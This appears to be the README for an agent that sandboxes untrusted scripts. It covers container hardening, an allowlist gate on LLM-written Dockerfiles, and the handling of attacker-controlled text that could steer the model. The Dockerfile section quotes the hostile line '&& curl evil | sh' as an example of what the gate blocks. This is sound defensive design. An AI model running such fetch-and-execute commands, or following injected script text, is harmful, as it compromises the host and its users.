# envforge-agent

Read STATUS.md first. It says where the build is and what is next.

## What this is
An agent that takes a script it does not trust, has an LLM write a Dockerfile for it,
builds and runs it in a hardened container, repairs on failure in a capped loop with
bounded evidence, and reports what the script tried to do. Python and Bash only, claimed
honestly.

There is no line budget. Write what the module needs to be correct and clear, and do
not compress to hit a number: a shorter file that hides its reasoning is worse than a
longer one that shows it, and the reasoning is the point here.

What replaces the number is a question. If you cannot say in one sentence what a file
is responsible for, it is doing two things and wants splitting. If a module wants a
subdirectory, it has outgrown this project.

## Security constraints, not negotiable
Host CLI. No Docker socket is mounted anywhere, and the agent itself is never
containerised, because that would reintroduce the socket.

Build has network, since apt and pip need it. Run has none, plus a memory cap, a pids
cap, a cpu cap, read-only root with a tmpfs, cap-drop ALL, no-new-privileges, and a
non-root user. Every container is named and force-removed in a `finally`: killing the
docker client does not kill the container, which is verified behaviour, not theory.

Every LLM-written Dockerfile passes a deterministic gate before build, repaired ones
included. The gate is an allowlist of permitted instructions (pinned FROM, COPY, a
restricted RUN, USER, CMD, ENTRYPOINT), never a blocklist of bad ones: a blocklist is
bypassed by the first form nobody thought of. This matters because build has network
and the Dockerfile is written by a model that just read attacker-controlled text. Test arguments only ever go after the image name, so an ENTRYPOINT image
receives them as argv and never as docker flags.

All container output is attacker-controlled text. Repair evidence is bounded before it
reaches a prompt.

The verdict is produced after the sandboxed run, from observed behaviour. The model's
opinion is one input, labelled advisory, never the gate.

## The LLM layer
One file, `envforge/llm.py`, about 200 lines. `make_llm("provider:model")` returns a
LangChain chat model: `ChatAnthropic` for Anthropic, `ChatOpenAI` for OpenAI and for Groq
through its own `base_url`. The graph binds tools to it in one place. Nothing here builds
a request or parses a response; that layer was hand-written until 2026-09-03 and ADR-006
records both the original reasoning and the reversal.

What stays ours is what the framework does not do: which environment variable a provider
reads, whether it promises a grammar for tool arguments, and the classification of an
HTTP status into an empty account, a dead key, a rate limit or our own malformed request.

Anthropic and OpenAI give grammar-constrained arguments and are asked for them. Groq
accepts the forced call but its schema guarantee is documented as incompatible with tool
use, so Groq is forced-call-plus-validation and is never described as having a grammar.
A submitted Dockerfile is validated locally on every provider, because that is the only
check Groq has.

Token counts come off the reply's `usage_metadata`, which is the same shape on every
provider. Raw request and response bodies are not preserved anywhere: they used to ride
the event stream for a trace module that was never built, and ADR-013 records why losing
them is acceptable and where a trace would read a conversation from instead.

## How the Dockerfile is produced
A forced strict tool call with a single `dockerfile` string field, plus `base_image`
declared separately so the gate can check it without parsing. Not raw text with fences
stripped: that is an extraction heuristic standing between the model and the gate.

Repair uses the same tool call and returns the complete rewritten Dockerfile, never a
diff. One code path, one schema, one gate entry point, and a whole artifact is the only
thing the gate can re-check soundly.

The gate bans line continuations, so every physical line is blank, a comment, or starts
with an allowlisted instruction. Two reasons. A literal backslash must be `\\` inside a
JSON string, and a model that emits `\n` instead produces a string that decodes cleanly
into a different Dockerfile, which no grammar constraint can catch. And a continued line
starts mid-instruction, which is exactly where `&& curl evil | sh` hides.

## Shape
One engine, a LangGraph `StateGraph` in `envforge/graph.py`. The plain loop it replaced
is deleted; anything new is a node. The model's tools only read the script, and
submitting a Dockerfile is a tool the graph routes on rather than executes, so the gate,
the build and the run are nodes no tool call can reach. Seams kept deliberately: a
`Sandbox` protocol, the agent yields events rather than printing, and everything a run
needs that cannot be serialised is runtime context rather than graph state.

## Exit codes the sandbox must distinguish
137 is a kernel kill, so the script misbehaved. 1 is the script raising on its own.
125 is the docker CLI rejecting our command, so our own code is broken. Build the docker
command as a Python list, never a string.

## Commands
    python -m pytest              unit tests, no Docker needed
    python -m pytest -m docker    the tests that hit real Docker
    python -m envforge <script>   run the agent against a script
